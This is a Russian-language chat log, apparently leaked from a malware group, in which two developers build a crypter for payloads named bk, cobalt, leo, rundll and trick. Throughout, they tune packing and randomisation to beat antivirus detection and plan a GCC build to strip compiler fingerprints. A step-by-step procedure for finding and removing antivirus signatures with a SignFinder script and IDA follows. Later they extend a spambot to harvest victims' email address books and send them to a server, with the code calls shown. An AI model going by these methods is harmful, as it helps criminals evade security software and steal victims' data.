[24.08.21 15:18:32] elroy:		unsigned char data[]; - вот это
А что делается со структурой, ее размер где-то берется?
[24.08.21 15:18:47] basil:		size_t dataSize;
[24.08.21 15:32:43] basil:		так . вроде сдвинулось. сейчас на leo протестирую
[24.08.21 15:41:13] elroy:		У меня вопрос
[24.08.21 15:41:33] basil:		да
[24.08.21 15:42:42] basil:		leo работает
[24.08.21 15:44:27] basil:		или заработал
[24.08.21 15:44:32] elroy:		```
struct Entry
{
	size_t dataSize;
	unsigned char data[];
};

// sizeof(Entry) == 4 ?

Entry* entry;
CompressDescript* descr = (CompressDescript*)entry->data;
```
entry->data - это указатель.
Если sizeof(Entry) == 4, то указатель лежит за пределами структуры. Собственно, в тех данных, что ты копируешь ранее в ту область памяти.
[24.08.21 15:45:14] elroy:		Мой вопрос звучит так, почему это работает вообще?
[24.08.21 15:45:42] basil:		это отсюда
[24.08.21 15:45:53] basil:		```
	Entry* entry = (Entry*)block;
	if (entry->dataSize == 0)
		return 0;

	CompressDescript* descr = (CompressDescript*)entry->data;
	if (descr->encryptType != ARITHMET_ENCRYPT)
		return 0;
```
[24.08.21 15:46:11] basil:		?
[24.08.21 15:46:26] elroy:		Может быть
[24.08.21 15:47:10] elroy:		Но проблема не в этом, там идет доступ к указателю. Указатель - это первые 8 байт, лежащий после структуры.
[24.08.21 15:47:39] basil:		вот именно что это не указатель. А данные
[24.08.21 15:47:51] basil:		причем.... Кстати говоря
[24.08.21 15:48:02] elroy:		entry->data - это обращение к указателю же
[24.08.21 15:48:14] elroy:		Ты из структуры вынимаешь указатель
[24.08.21 15:48:18] elroy:		А не данные
[24.08.21 15:48:54] elroy:		data - по задумке указатель на данные.
[24.08.21 15:49:00] elroy:		Но его нет в структуре
[24.08.21 15:49:28] basil:		unsigned char* data - вот так был бы указатель
[24.08.21 15:49:30] elroy:		ибо он объявлен как [] и структура имеет размер 4 байта (почему-то)
[24.08.21 15:50:02] elroy:		unsigned char data[1212] - это тоже указатель на начало массива
[24.08.21 15:50:42] basil:		дело еще в том что в скобках ничего нет
[24.08.21 15:51:02] basil:		обрати внимание
[24.08.21 15:51:12] elroy:		поэтому структура не создана полностью
[24.08.21 15:52:18] basil:		да. есть такое дело. Я в дельнейшем добавляю туда данные. А когда ее надо куда-то скопировать , я обращаюсь к первому элементу структуры
[24.08.21 15:52:36] basil:		что бы узнать размер этих данных
[24.08.21 15:54:09] elroy:		Перепиши этот участок по человечески. Если используется структура - используй нормальные указатели, если они там нужны. Если надо скопировать данные и спрятать их за структурой, то доступ к ним будет
char* ptr = (char*)entry + sizeof(entry);
[24.08.21 15:54:23] elroy:		```
char ptr = (char)entry + sizeof(entry);
```
[24.08.21 15:55:30] elroy:		И самое невероятное, оно почему-то работает...
[24.08.21 15:56:25] basil:		да. в моей практике такое случается
[24.08.21 15:56:48] basil:		и кстати как ни странно неоднократно
[24.08.21 15:57:04] elroy:		Да)
[24.08.21 15:57:15] elroy:		Заставишь работать код, который не должен
[24.08.21 15:57:24] elroy:		Оно работает, хоть и упирается)))
[24.08.21 15:58:40] basil:		сколько раз я про себя слышал. "Странный ты...." Ну не виноватя. Я стараюсь быть нормальным человеком. Хотя и слабо получается
[24.08.21 15:59:04] basil:		Хорошо. Сейчас еще остальные проверю. И переделаю как ты сказал
[24.08.21 15:59:14] elroy:		ок, спасибо)
[24.08.21 16:16:19] basil:		rundll_x86.dll работает, если еще добавить --gen-exports yes. Это правильно?
[25.08.21 08:45:15] basil:		Приветствую!
[25.08.21 08:45:28] elroy:		Приветствую. Ты вчера что-то писал, не пришло
[25.08.21 08:45:37] basil:		Да. было дело
[25.08.21 08:45:40] basil:		сейчас
[25.08.21 08:46:47] basil:		Вчера протестировал Leo - заработал. Потом начал тестировать bk и rundll. Там же при сборке надо было пробросить экспорт? Правильно? Ну чтобы крпт проверить.
[25.08.21 08:46:59] basil:		Ветку в leo я влил
[25.08.21 08:47:30] elroy:		Да, надо  было пробросить
[25.08.21 08:48:28] basil:		Я пробросил запустил с появившимися экспортируемыми функциями. Появились MessageBox. Я так понимаю работает. Вливаю оставшиеся ветки?
[25.08.21 08:48:58] elroy:		Переписал код, что я порсил?
[25.08.21 08:49:26] basil:		Именно тот который ты просил переписал.
[25.08.21 08:49:48] basil:		```
+sizeof(Entry)
```
[25.08.21 08:50:01] elroy:		Хорошо, вливай develop ветки.
[25.08.21 08:59:33] basil:		залил
[25.08.21 09:00:02] basil:		теперь я так понимаю надо браться за crt?
[25.08.21 09:00:31] elroy:		Залил же только develop ветки, так?
[25.08.21 09:01:37] elroy:		Были реконнекты, повтори сообщения
[25.08.21 09:02:33] basil:		да
```
develop_payload_bk
develop_payload_cobalt
develop_payload_generic
develop_payload_loader-bot-leo
develop_payload_rundll
develop_payload_trick
```
[25.08.21 09:02:40] basil:		теперь я так понимаю надо браться за crt?
[25.08.21 09:03:18] basil:		или будем бороться за размер шифрованных  данных?
[25.08.21 09:04:09] elroy:		Теперь надо проверить ветки develop на билдмашине, через тестовый профиль, проверить файлы на работоспособность.
[25.08.21 09:05:37] elroy:		Потом - да, бороться за размер. Но ведь ты заменил алгоритм, теперь xor-key для фрагментов генерируется через double. Это разве не повлияло на размер?
[25.08.21 09:06:41] basil:		повлияло. Но лучше будет, конечно, если еще уменьшим размер дескриптора для арифметического сжатия
[25.08.21 09:06:59] elroy:		Хорошо. Уменьши.
[25.08.21 09:08:09] elroy:		Учитывая особенности твоего доступа к интернету, займиьс уменьшением в новой ветке. А вечером проверь на билдмашине develop профили
[25.08.21 09:10:32] basil:		хорошо
[25.08.21 15:23:51] basil:		проестировал leo64,bk32,bk64,rundll32,rundll64. Для bk и rundll сделал проброс экспорта. Там был экспорт Test1,Test2,Test3, One, Two,Three
[25.08.21 15:24:23] basil:		Собирал на билд машине. MessageBox появлялись
[25.08.21 15:32:54] elroy:		Хорошо
[25.08.21 15:33:05] elroy:		Размером занимался, как результаты?
[25.08.21 15:37:52] basil:		размером занимался. Но результаты...... Как тебе сказать. Раз на раз не приходится. Я смотрел какой итогововый дескриптор получается.... И вижу что все очень зависит от энтропии данных . Если энтропия высокая, там практически каждый элемент занят. Если низкая - то сжать его (дескриптор) можно. И сжать ну не на 50% , а на 10-15 можно. Учитавая что в бинарнике все подряд значения то получается где-то 8%.
[25.08.21 15:39:16] elroy:		Ну 8% больше чем ничего, и итоговый будет меньше на те же 8%.
[25.08.21 15:39:42] elroy:		Манипуляция с ксор-криптованием фрагментов дала результаты, файл стал меньше?
[25.08.21 15:40:13] basil:		Да стал. Ну иметься ввиду зашированный бинарник
[25.08.21 15:40:28] elroy:		Ну да, он.
[25.08.21 15:41:25] elroy:		Вот мы тогда в итоге выигрываем уменьшение до 40% + 8%
[25.08.21 15:41:56] basil:		сам файл итогововый  из билд машины - там как получится. Размер варьируется где-то в пределах 100 кб. Для файла в 1,200 кб
[25.08.21 15:42:06] basil:		а 40% это что ?
[25.08.21 15:42:11] basil:		Я не понял
[25.08.21 15:44:49] elroy:		Была чисто арифметическая запаковка.
Затем стало 60% арифметический, 40% ксор. Т.е. прирост объема пришелся не на 100% файла, а на 60%. Так?
8% (в идеале) ты говоришь съекономится от этих 60%, если дескрипторы поприжимать.
Да, согласен. именно скалдывать проценты не стоило, не 48.
[25.08.21 15:45:28] elroy:		*не на 100% пайлоада (исходного файла)
[25.08.21 15:47:18] basil:		Скажем так. Ощутимое сжатие данных для xor и не особо ощутимое для fhbavtnbxtcrjuj c;fnbz
[25.08.21 15:48:07] basil:		арифметического сжатия. Даже если мы попробуем хранить в дескрипторе арифметического сжатия только частоты встречающихся байтов, отличных от нуля
[25.08.21 15:49:22] basil:		если мы не будет давать цифр
[25.08.21 15:49:48] elroy:		Я вообще не увидел эти 40%... Криптер как раньше собирался, так и собирается. Такого же размера
[25.08.21 15:50:08] elroy:		Или я не заметил просто?
[25.08.21 15:50:52] elroy:		Собери двумя методами, старым и новым пару-тройку раз нагрузку размером около 100 кб.
[25.08.21 15:51:07] elroy:		Будет разница?
[25.08.21 16:21:50] basil:		разница есть
[25.08.21 16:22:18] basil:		файл (изначальный) - 836 кб
[25.08.21 16:22:46] basil:		старый метод 4564  4579   4560
[25.08.21 16:23:05] basil:		новый метод  3899 3898 3857
[25.08.21 16:23:15] basil:		все килобайтах
[25.08.21 16:24:51] elroy:		15%
[25.08.21 16:25:02] elroy:		Ну согласен, не плохо
[25.08.21 16:25:16] elroy:		Странно, что не 40
[25.08.21 16:25:28] elroy:		или хотя бы 30
[25.08.21 16:25:32] elroy:		Всего лишь 15
[25.08.21 16:25:59] elroy:		Там точно корректно все работает, не уходят лишние данные в пайлоад?
[25.08.21 16:26:30] basil:		сейчас все перепроверю
[25.08.21 16:26:40] basil:		позапускаю
[25.08.21 16:27:00] elroy:		Сделай пожалуйста тест с 30 процентами арифметического и 70% ксор
[25.08.21 16:27:24] basil:		хорошо.
[25.08.21 17:02:10] basil:		старый метод - 4558 4565 4539 4581
70% xor           - 2699 3034 2963 2934
[25.08.21 17:02:18] basil:		бинарники работают
[25.08.21 17:03:09] elroy:		Тогда оставь так
[25.08.21 17:03:17] elroy:		Пусть будет 70% ксор
[25.08.21 17:04:15] elroy:		Вот еще что надо. Я раньше писал, что нужно к загружаемому файлу езе добавлять некоторый процент мусора, в зависимости от его размера
[25.08.21 17:04:51] basil:		может. Честно говоря не помню. Что надо сделать?
[25.08.21 17:05:09] basil:		У нас же там еще данные энтропии
[25.08.21 17:05:11] elroy:		Сейчас xor и арифметический метод заданы строго или имеют случайный процент?
[25.08.21 17:06:16] basil:		размер каждого отдельного блока случаен. Но соотношение xor и арифметического сжатия постоянен.
[25.08.21 17:08:14] elroy:		Хорошо, что размер блока случаен. Это очень хорошо!
Сделай еще 65-75% ксор,  случайно чтобы ставился, остальное арифметический
[25.08.21 17:09:00] basil:		можно сейчавс
[25.08.21 17:10:29] elroy:		Еще одну доработку заоодно обавь
[25.08.21 17:10:41] basil:		да. слушаю
[25.08.21 17:15:13] elroy:		Там где у нас случайный генератор в SolutionBuilder, во всех его реализация замени на такую генерацию:
```
#include <intrin.h> 

unsigned int rnd;

if (!_rdrand32_step(&rnd)) 
	rnd = GetRandom(&RandomContext); // генерация не отработала, используем старый метод

// дальше юзаем rnd
```
[25.08.21 17:15:48] elroy:		Починить просто в самом генераторе
[25.08.21 17:16:07] elroy:		Это способ запросить случайное число инструкцией с процессора
[25.08.21 17:16:24] elroy:		Типа hardware random
[25.08.21 17:17:38] elroy:		А то неприятности у нас с генераторм, мне кажется. Генерирует он не рандом)
[25.08.21 17:18:10] basil:		момент
[25.08.21 17:21:45] basil:		да. я понял. ок
[25.08.21 17:22:34] elroy:		Ок, тогда обнови develop и профили develop, проверь еще раз develop ветки. И сообщи тогда)
[25.08.21 17:22:51] basil:		ок
[25.08.21 18:03:29] basil:		еще на месте?
[25.08.21 18:09:00] basil:		Протестировал bk,leo,rundll
[25.08.21 18:09:04] basil:		все работает
[26.08.21 09:25:44] elroy:		Ты вчера что-то писал, что-то не пришло...
[26.08.21 09:25:50] elroy:		Приветствую
[26.08.21 09:25:58] basil:		Приветствую
[26.08.21 09:26:15] basil:		Да писал. Я вчера проверил rundll, bk, leo
[26.08.21 09:26:21] basil:		Работает
[26.08.21 09:26:30] basil:		черз билд машину
[26.08.21 09:27:59] elroy:		Тогда сделай так:
```
git checkout beta_payload_generic
git pull
git merge develop_payload_generic
git push
```
Т.е. влить в каждую ветку beta_ свою ветку develop_
[26.08.21 09:28:34] basil:		ок
[26.08.21 09:37:21] elroy:		Насчет спамбота, я как-то спрашивал про готовность версии dll. Ты говорил, что готово
[26.08.21 09:37:31] elroy:		Ее можно собрать и отдать заказчику?
[26.08.21 09:47:23] basil:		да. я думаю можно. Кому?
[26.08.21 09:47:37] basil:		и там надо знать прототип функции
[26.08.21 09:47:43] basil:		экспортируемой
[26.08.21 09:49:57] elroy:		А, да. Надо. Надо тогда узнать с каким ботом бует он работать.
[26.08.21 09:50:07] elroy:		Я узнаю, скажу тогда
[26.08.21 09:50:13] basil:		да. ок
[26.08.21 09:50:27] basil:		ветви обновил. Залил
[27.08.21 14:52:36] elroy:		Приветствую
[27.08.21 14:52:44] basil:		Приветствую
[27.08.21 14:53:22] elroy:		Сегодня криптовал обновленными профилям локально, все чисто, наверное даже работает (сам не тестил нагрузку).
[27.08.21 14:53:33] elroy:		Пропали детекты есета и еще там было
[27.08.21 14:54:35] elroy:		Но вот какая проблема, если делаю билд локально - чисто. Если делаю на билдмашине, то Ikarus АВ говорит "Крипт". Интересно, что других детектов нет, а он вот есть.
[27.08.21 14:55:06] basil:		А мог компилятор засветиться?
[27.08.21 14:55:06] elroy:		Спрашивал насчет спамбота, что-то снова тишина
[27.08.21 14:55:17] elroy:		Да все могло быть
[27.08.21 14:55:52] elroy:		Даже премию silver повесил для того, кто найдет отпечаток компилятора и найдет как его чистить.
[27.08.21 14:56:09] elroy:		Многие натыкались на то, что все же есть след компилятора
[27.08.21 14:56:20] elroy:		Но точного описания следа - нет
[27.08.21 14:56:37] elroy:		Есть только что-то типа "там версия линкера другая"
[27.08.21 14:56:52] elroy:		Она то другая, линкуется иначе, но как сам след поймать...
[27.08.21 14:57:26] basil:		Вот у меня предложение перейти на GCC
[27.08.21 14:57:33] basil:		Как на это смотришь?
[27.08.21 14:57:55] elroy:		Позитивно. Наш код там соберется с его кучей макросов?)
[27.08.21 14:59:02] elroy:		Надо еще llvmo профили подчистить, обфусцирующий компилятор как ни как
[27.08.21 15:00:07] basil:		ну по идее каких-то ограничений на использование макросов не должно быть. По идее....
[27.08.21 15:00:26] elroy:		Вот попробуй собрать
[27.08.21 15:00:31] elroy:		Хорошее дело сделаешь)
[27.08.21 15:00:42] basil:		ок. давай. Займусь этим
[27.08.21 15:00:45] basil:		хорошо
[27.08.21 15:01:01] basil:		Вот еще что насчет следа копиллятора.
[27.08.21 15:02:09] basil:		Мне кажется что надо сделать helloWorld проект. И попросить кодеров собрать его и выслать бинарники. Под одинаковой версией студии конечно. И одинаковыми настройками
[27.08.21 15:02:35] basil:		Может их сравнение что-то может дать? Тебе такая мысль не приходила?
[27.08.21 15:02:43] basil:		Или уже пробовали?
[27.08.21 15:02:44] elroy:		Такое можно и самому провернуть, развернув множество машин
[27.08.21 15:03:04] elroy:		Не пробовали)
[27.08.21 15:03:14] elroy:		Да, можно и так наверное
[27.08.21 15:03:37] basil:		Ну а если майкрософ привязывает какой-то отпечаток в ip адресу закачки.
[27.08.21 15:03:38] basil:		?
[27.08.21 15:03:58] basil:		Я бы так и сделал для таких целей
[27.08.21 15:04:27] elroy:		Нет, дело точно не в этом. Такая гадость называется safebrowsing, о ней раньеш уже говорили, но просто это именно не тот случай
[27.08.21 15:08:26] basil:		Ну ладно. Хорошо. Тогда я займусь привязкой GCC. Но мне кажется для частоты эксперимента надо все таки попросить сотрудников стандартно установить студию на чистую 7. И собрать проект. Если там есть различия в файлах - то это может все таки существенно сузить область поиска. ДА и для частоты эксперимента это будет важно
[27.08.21 15:09:07] elroy:		Это проблема, потому как не все могут одну и ту же версию поставить, а это существенно нарушает эксперимент
[27.08.21 15:10:22] elroy:		Майкрософтцы правят баги на проде.. дикари..
[27.08.21 15:10:46] basil:		тогда получается еще и день надо согласовать
[27.08.21 15:10:50] basil:		еще интереснее
[27.08.21 15:11:30] elroy:		Это проблема, я тебе точно говорю...
[27.08.21 15:13:29] basil:		сейчас кстати на билдмашине студия же стоит? Правильно?
[27.08.21 15:13:41] elroy:		Три)
[27.08.21 15:14:05] basil:		всмысле 3 версии?
[27.08.21 15:15:03] elroy:		Да. 2017 2019 Enterprise и еще Professional, не помню 2017 или 2019
[27.08.21 15:15:14] elroy:		Кстати, там eng версии стоят
[27.08.21 15:15:51] basil:		да уж. на любой вкус и цвет)))
[27.08.21 15:16:02] basil:		С запасом так сказать
[27.08.21 15:16:13] elroy:		Как кодеры просили...
[27.08.21 15:16:23] elroy:		Попробуй gcc, правда интересно
[27.08.21 15:16:33] elroy:		Интересно, что оно под винду собирает
[27.08.21 15:16:50] basil:		ок. хорошо
[27.08.21 15:20:40] elroy:		Я поработаю с криптером, если что-то править будешь, то в отдельной ветке
[27.08.21 15:21:08] basil:		хорошо
[30.08.21 09:23:26] basil:		Приветствую
[30.08.21 09:32:35] elroy:		Приветствую
[30.08.21 09:34:36] basil:		Хорошие новости. Мне так кажется. Тут на выходных удалось , правда, с горем пополам присоединить GCC к проекту. Пока весь проект перенести не удалось. Но на мой взгляд самое главное , что работает обфускация. GCC ее коррекно отрабатывает
[30.08.21 09:35:27] basil:		Пока использую MinGW, по есть возмодность собрать компилятор из исходников
[30.08.21 09:35:39] elroy:		Весь проект - все решение, или речь о проекте UniCrypter?
[30.08.21 09:36:17] basil:		именно криптер. А нужно все решение переводить на GCC&
[30.08.21 09:36:18] basil:		?
[30.08.21 09:36:27] elroy:		Нет)
[30.08.21 09:36:44] elroy:		Там профиль просто добавить нужно, файл config в solution builder
[30.08.21 09:37:16] basil:		Хорошо. Сейчас опишу ситуацию , которая сложилась на текущий момент
[30.08.21 09:37:24] basil:		Так сказать с подробностямми
[30.08.21 09:39:01] basil:		Попробовал сначала присоединить GCC с использованием CMake, но без особых результатов. Там конечно "густой лес" куча каких-то непонятных файлов с непонятным назначение. Вот.
[30.08.21 09:39:03] basil:		Но потом
[30.08.21 09:42:41] basil:		Есть расширение, для студии. Называется VisualGDB. Но создает проект. Нормальный читаемый, где более менее все понятно и делает это из коробки. С помощью этого расширения удалось использовать GCC. Единственное сейчас почему-то бинарник получается достаточно большой. Hello world где-то 300 кб. Есть предположение, что там какие-то флаги особенные стоят.
[30.08.21 09:43:13] basil:		Флаги компилятора естественно
[30.08.21 09:43:52] basil:		Но я думаю , что это преодолимо. Короче фундаментальная возможность перевести криптор на GCC - есть
[30.08.21 09:44:20] elroy:		Ты написал что используется mingw
[30.08.21 09:44:36] basil:		На текущий момент. Да
[30.08.21 09:45:58] elroy:		На сколько я знаю, там используется библиотека для работы кода под винду, типа преобразования лукс-винда. От этого и размер. Т.е. он не собирает код именно под винду голую (ну так было раньше). Из-за этого костыля там и размер повыше всегда
[30.08.21 09:46:56] elroy:		Я не думаю, что размер будет расти, он просто стабильно будет на несколько сот кб больше
[30.08.21 09:48:01] basil:		У меня тоже было такое предположение. И еще можно все таки попытаться собрать свой чистый компилятор из исходников
[30.08.21 09:48:11] basil:		Может это что-то даст
[30.08.21 09:48:25] elroy:		Пока нет, не даст.)
[30.08.21 09:48:31] elroy:		Пока запусти на том что есть)
[30.08.21 09:48:43] basil:		хорошо
[30.08.21 09:48:53] elroy:		Так а что не работает с проектом криптера, в чем проблема там?
[30.08.21 09:50:25] basil:		ну на текущий момент почему-то можно запустить отладку -  она работает. Трассировал. Все нормально. Но когда я пытаюсь запустить бинарник - он орет "не хватает библиотеки, мы все умрем" и закрывается
[30.08.21 09:50:32] basil:		В чем дело пока не понимаю
[30.08.21 09:51:26] elroy:		У gcc была фича, которая собирает "большой монолитный билд", куда включает все нужные библиотеки
[30.08.21 09:51:35] elroy:		Ппсмотри аргумент
[30.08.21 09:52:05] basil:		--static
[30.08.21 09:52:11] basil:		по моему так
[30.08.21 09:52:23] elroy:		Нет, еще был
[30.08.21 09:52:58] basil:		ну короче. Там с флагами надо как-то разобраться
[30.08.21 09:53:23] elroy:		Да
[30.08.21 14:37:30] basil:		Прочитал. С martin на связи
[30.08.21 14:39:05] elroy:		ОК
[30.08.21 14:43:26] elroy:		Есть в main бота сбор адресов с локальных мейлов и с вебмейлов.
Вот после этой конструкции
```
if (mailing_params.mailout_type & MAILOUT_ALL_LOCAL_WEBCLIENT)
		{
			debug_printf("Collecting e-mail addresses from local web mail clients\r\n");
			size_t mailing_emails_count = mailing_emails.size();
			CollectLocalWebEmails(mailing_emails);
			debug_printf("Found %d new e-mail addresses, total %d\r\n",
				mailing_emails.size() - mailing_emails_count, mailing_emails.size());
		}
```
Надо добавить вызов метода
```
Server->SendAddressBook(mailing_emails);
```
Ну и соответственно реализовать метод, по аналогии с sendinfo
```
bool Server->SendAddressBook(std::set<std::string> &emails);
```
[30.08.21 14:44:13] basil:		да. я понял. Только вот один вопрос.
[30.08.21 14:45:05] basil:		Хотя. Погоди.  Сейчас
[30.08.21 14:46:44] basil:		Вот эту отправку адресов делать независимо от того выбрана рассылка через Outlook или нети
[30.08.21 14:46:47] basil:		нет*
[30.08.21 14:46:50] basil:		Правильно?
[30.08.21 14:48:25] elroy:		Спроси в канале вопрос, вопрос хороший. Эксплуатируем мы outlook или нет, если с ним не работаем
[31.08.21 09:28:24] basil:		Приветствую
[31.08.21 09:30:17] elroy:		Приветствую
[31.08.21 09:32:17] basil:		Вчера с martin вроде как сделали отправку записей адресной книги. По крайней мере данные отправляемые он увидел. Падений нет. Кроссразрядный бот я тоже, правда на локальном сервере, протестировал. С GCC пока в процессе
[31.08.21 09:32:54] elroy:		По поводу бота отпишись в группе, чтобы сильвер тоже видел
[31.08.21 09:33:07] elroy:		Хорошо, занимайся gcc, если спамбот работает
[31.08.21 09:33:32] elroy:		Я на днях попрошу сервер для заказчика, надо будет потестить снова
[31.08.21 09:33:41] basil:		Ок
[01.09.21 09:33:29] elroy:		Проверим
[01.09.21 09:36:03] basil:		да . есть
[01.09.21 09:36:20] elroy:		Работает чтоли?
[01.09.21 09:36:36] basil:		я по крайней мере увидел)))
[01.09.21 09:38:14] elroy:		Бывает же
[01.09.21 09:38:19] elroy:		e2e заработал
[01.09.21 09:38:28] elroy:		Приветствую)
[01.09.21 09:38:33] basil:		Приветствую
[01.09.21 09:39:12] elroy:		Я в отпуске планирую с 16 по 30 сентбря, криптер будет на тебе в это время. Собери вопросы по чистке, профилям и т.д.
[01.09.21 09:39:52] basil:		хорошо. как же я без тебя(((((
[01.09.21 09:39:55] basil:		?
[01.09.21 09:40:00] basil:		это ужасно
[01.09.21 09:41:39] basil:		ок. Для gcc статический бинарник собрать удалось. Как я и думал флаг -static для линковщика. Некоторые типы примитивных данных GCC для win не поддерживает. Так же некоторые проблемы в WinApi, но я думаю все равно переборю эти сложности
[01.09.21 15:24:12] basil:		Тут вопрос возник. Точнее пока 2.
[01.09.21 15:25:17] basil:		тест
[01.09.21 15:25:24] basil:		пардон не включил
[01.09.21 15:25:40] basil:		```
beta_payload_bk
beta_payload_cobalt
beta_payload_generic
beta_payload_loader-bot-leo
beta_payload_rundll
beta_payload_trick
```
[01.09.21 15:25:47] elroy:		Е2Е обычно не нужно включать, он сам работает
[01.09.21 15:26:01] basil:		возможно сам выключил
[01.09.21 15:26:09] elroy:		Давай, спрашивай)
[01.09.21 15:26:33] basil:		я так понимаю все ветви узкоспециализированные под конкретную нагрузку
[01.09.21 15:26:39] basil:		Правильно?
[01.09.21 15:26:45] elroy:		Да
[01.09.21 15:27:11] basil:		Т.е. ими криптуются одни и те же файлы?
[01.09.21 15:27:21] basil:		или как то  что -то меняется
[01.09.21 15:27:25] basil:		?
[01.09.21 15:27:37] elroy:		Файлы "одни и те же" меняются.
[01.09.21 15:27:44] elroy:		Ну как бы..
[01.09.21 15:27:57] elroy:		generic - универсален
[01.09.21 15:28:04] elroy:		rundll - универсален
[01.09.21 15:28:10] elroy:		Остальное специализировано
[01.09.21 15:28:17] elroy:		У тебя есть описание профилей?
[01.09.21 15:28:55] basil:		Я просто думаю как потом мне в случае чего проверить работоспособность нагрузки. Вот как это делается на текущий момент?
[01.09.21 15:29:34] elroy:		Ок, я напишу как. Давай чуть-чуть позже)
[01.09.21 15:30:03] basil:		Хорошо. Мне позже тогда списаться? Сечас занят?
[01.09.21 15:30:12] basil:		несколько
[01.09.21 15:30:19] elroy:		Сейчас занят, напишу через час наверное
[01.09.21 15:30:27] basil:		хорошо. маякниэ
[01.09.21 16:15:06] elroy:		https://file.io/utsxNIUxTrsC
```
U..Ug6gs{jaPa!D@SakSa{Ascx#d
```
[01.09.21 16:19:35] elroy:		Это было описание профилей и системы криптования.
Описание профилей свежее, если раньше я уже скидывал, обнови у себя.
[01.09.21 16:19:48] elroy:		А это все тесты с исходниками, что у меня есть.
https://file.io/IZ5zhZ6xwWpg
[01.09.21 16:22:22] basil:		хорошо. принял. Буду возникнут вопросы - я могу написать?
[01.09.21 16:23:42] elroy:		Ты всегда можешь написать, разумеется)
[01.09.21 16:23:48] elroy:		Проверка generic exe, думаю понятна.
dll->exe   - в качестве dll берем библиотеку rundll, криптуем ее, отабатывает точка вход, надо увидеть сообщение "DllMain() called, TLS OK"
[01.09.21 16:24:08] elroy:		Провиль bk - на основе rundll
[01.09.21 16:25:00] elroy:		Для rundll тоже самое, эта же библиотека, надо увидеть два сообщение, "DllMain() called, TLS OK" и сообщение от функции вызова, например от One, там 4 параметра
[01.09.21 16:26:07] elroy:		Для Лео - библиотека теста Лео, там надо увидеть в main сообщение с путем к файлу. Если эту же тестовую библиотеку закриптовать с помощь rundll или bk - путь к файлу бутет пустой
[01.09.21 16:26:14] elroy:		Шеллкоды думаю понятно
[01.09.21 16:26:36] elroy:		cobalt - ждем от мануэля запроса на крипт, он пока не подтвердил ничего
[01.09.21 16:27:01] elroy:		трик - это exe generic, но без обработки таблицы импорта нагрузки
[01.09.21 16:27:11] elroy:		В общем-то все...
[01.09.21 16:28:36] basil:		Хорошо. Вот вопрос. Пробовал я использовать avclean, но там ограниченный набор АВ. Или надо использовать ключ -define
[01.09.21 16:29:28] elroy:		Там почти никогда не работает конкретный ав. Надо ставить general, кажись -a general
[01.09.21 16:29:28] basil:		-defaulth
[01.09.21 16:29:37] elroy:		И таймаут...
[01.09.21 16:29:48] elroy:		Или default
[01.09.21 16:29:51] elroy:		не помню)
[01.09.21 16:30:13] basil:		в течении которого avclean смотрит удалил ли АВ файл или нет
[01.09.21 16:30:23] elroy:		Да
[01.09.21 16:31:08] basil:		видимо у вругих АВ непонятный API. Удобная конечно очень утилита. Иначе чистка - мучение.
[01.09.21 16:31:43] elroy:		А как же метод с SignFInder ?
[01.09.21 16:31:51] elroy:		Я только им и пользуюсь
[01.09.21 16:31:56] elroy:		Только он работает
[01.09.21 16:32:29] basil:		Вот как то речь о нем заходила. Но я так и не пользовался. Можешь рассказать?
[01.09.21 16:32:38] elroy:		Да
[01.09.21 16:33:51] basil:		Хорошо. Внимательно слушаю. И желательно саму утилиту
[01.09.21 16:34:46] elroy:		https://file.io/Iqcf8zfcxC2m
[01.09.21 16:34:55] elroy:		Это исправленный скрипт
[01.09.21 16:36:59] elroy:		Как это работает
Снчала делаем build.bat .... как обычно.
Затем открываем решение в студии, выбираем проект и профиль сборки, собираем, получаем файл исполнительный (или dll) и pdb.
[01.09.21 16:37:41] elroy:		На машине должна стоят IDA, там где компилил или придется подсунуть файл .pdb чтобы ида смогла его открыть
[01.09.21 16:37:59] basil:		ну это не сложно. А дальше?
[01.09.21 16:38:27] elroy:		Кидаешь .dll ма машину с ав, рядом со скриптом. Каталог со скриптом добавляешь в исключения
[01.09.21 16:38:44] elroy:		пише в консоли
[01.09.21 16:39:06] elroy:		sf.new.py file.exe sect 0
[01.09.21 16:39:31] elroy:		Оно создает рядом каталог, в имени каталога информация, количество фрагментов..
[01.09.21 16:39:45] elroy:		Каталог копируешь на стол, или в другое местои проверяешь на АВ
[01.09.21 16:40:14] elroy:		Все файлы, которые остались после проверки - чистые. Т.е. в них была удалена сигнатура
[01.09.21 16:41:54] elroy:		Снова в консоли
sf.new.py file.exe man <смещение> <размер> <количество байт, обычно 40>
Эти параметры указываются в 16ти ричной системе, 40 - это тоже, это 64 байта.
<смещение> <размер> находятся в именах файлов
[01.09.21 16:42:30] elroy:		Получаешь папку
[01.09.21 16:42:34] elroy:		Тоже на проверку
[01.09.21 16:42:46] elroy:		Получаешь оставшиесся файлы
[01.09.21 16:43:04] basil:		т.е. ты последоватьльено увеличиываешь дискретность
[01.09.21 16:43:27] elroy:		Обычно в два подхода, как описал.
[01.09.21 16:43:42] elroy:		Обычно больше не требуется, но да, можно и больше, сколько угодно
[01.09.21 16:43:48] elroy:		64 байта считается оптимальным
[01.09.21 16:44:21] basil:		Слушай, а чем тогда эта утилита отличается от той, которую мы до этого использовали?
[01.09.21 16:45:31] elroy:		После последней итерации берешь из имен файлов смещение и размер, в 16ти рично системе.
Открываешь файл оригинальный в IDA, разрешаешь подтянуть .pdb, затем Jump -> Jump to file offset, указываешь смещение
[01.09.21 16:45:36] elroy:		Это твоя сигнатура
[01.09.21 16:45:57] elroy:		Благодаря pdb виндно в какой функции она находится
[01.09.21 16:46:08] elroy:		Это пример поиска по коду детектов
[01.09.21 16:46:33] elroy:		Попробуй использовать...
[01.09.21 16:46:43] elroy:		Отличается утилита скоростью работы
[01.09.21 16:47:11] elroy:		И она не рвет файл по хз каким фрагментам вперемешку с pe заголовками, а обрабатывает заданную секцию
[01.09.21 16:47:16] elroy:		Немного умнее утилита
[01.09.21 16:47:19] elroy:		И работает быстрее
[01.09.21 16:48:15] basil:		sect 0 - секция кода видимо?
[01.09.21 16:48:35] elroy:		да
[01.09.21 16:48:46] elroy:		Бывают детекты и в других местах
[01.09.21 16:48:57] elroy:		Бывают по эмуляции, надо править код тогда
[01.09.21 16:49:10] elroy:		Этот инструмент лишь находит где оно...
[01.09.21 16:50:00] basil:		Ну большего наверное от него не будет. Но тоже хорошо. А можно еще описать как ты проверяешь эмуляцию файла?
[01.09.21 16:52:21] elroy:		Вставляю выход по ходу эмуляции
[01.09.21 16:52:30] elroy:		Или return
[01.09.21 16:52:46] elroy:		или цикл пересчета до бесконечности
[01.09.21 16:52:53] elroy:		Смотря на что клюёт )
[01.09.21 16:53:20] elroy:		Можно комментить тот фрагмент
[01.09.21 16:53:55] elroy:		У нас часто были детекты после того, как он доберется до API, вот тот вариант с винапи, что там есть.
